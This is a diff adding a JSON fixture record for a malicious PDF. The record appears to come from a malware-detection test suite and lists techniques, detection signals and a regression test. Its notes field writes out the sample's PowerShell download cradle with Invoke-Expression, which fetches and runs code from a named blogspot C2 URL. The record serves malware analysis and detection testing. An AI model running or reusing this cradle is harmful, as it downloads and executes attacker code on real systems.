@@ -1,0 +1,41 @@
+{
+  "id": "mshta-italian-sandbox-escape",
+  "filename": "mshta-italian-sandbox-escape-ef6dff9b.pdf",
+  "sha256": "ef6dff9b48f9cc08ab6325b728e40f0444a9d1650d228a770105d601cc66c253",
+  "fixture_path": "corpus_captured/mshta-italian-sandbox-escape-ef6dff9b.pdf",
+  "source": "mwb-latest corpus (2026-02-23)",
+  "threat_actor": "Unknown (Italian-language campaign)",
+  "threat_family": "mshta-powershell-downloader",
+  "classification": "Malicious",
+  "techniques": [
+    "launch-action",
+    "mshta-execution",
+    "powershell-bypass",
+    "execution-policy-bypass",
+    "javascript-url-scheme",
+    "activexobject-shellexecute",
+    "social-engineering-alert",
+    "blogspot-c2",
+    "tls12-download-cradle",
+    "invoke-expression-iex"
+  ],
+  "mitre_attack": ["T1059.001", "T1059.005", "T1218.005", "T1566.001", "T1105", "T1204.001"],
+  "detection_signals": [
+    "launch_action_present: high/strong (target=mshta, initiation=automatic)",
+    "launch_external_program: high/strong (mshta with javascript: URL scheme)",
+    "powershell_payload_present: low/probable (invoke-expression, -ep Bypass)",
+    "action_automatic_trigger: high/strong (OpenAction)",
+    "js_intent_user_interaction: high/strong (Italian-language alert lure)",
+    "annotation_action_chain: high/strong (bookinq.netlify.app decoy URI)",
+    "composite.graph_evasion_with_execute: high/probable",
+    "renderer_behavior_divergence_known_path: high/strong",
+    "aa_event_present: medium/probable x2 (/JS, /S events)",
+    "passive_external_resource_fetch: medium/strong"
+  ],
+  "intent_buckets": ["SandboxEscape", "DataExfiltration", "Phishing", "ExploitPrimitive"],
+  "verdict": "Malicious",
+  "regression_test": "mshta_italian_sandbox_escape_detections_present",
+  "first_seen": "2026-02-23",
+  "analysis_date": "2026-02-28",
+  "notes": "Full mshta-to-PowerShell kill chain: PDF opens -> Italian-language JS alert (social engineering) -> OpenAction -> Launch(mshta) -> mshta executes javascript: URL -> ActiveXObject SHELLEXECUTE -> PowerShell -ep Bypass -c [Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; Invoke-Expression(IrM https://hotelmay21.blogspot.com////phudi.pdf). C2 URL embedded in launch action /P parameter. Note: 'SecuriptyProtocol' typo in payload (likely intentional for detection evasion). Same Italian alert lure as booking-js-phishing (379b41e3) - same campaign. Chain gap: OpenAction->Launch->PowerShell->C2 not represented in a single end-to-end chain. C2 URL not extracted into a dedicated finding."
+}
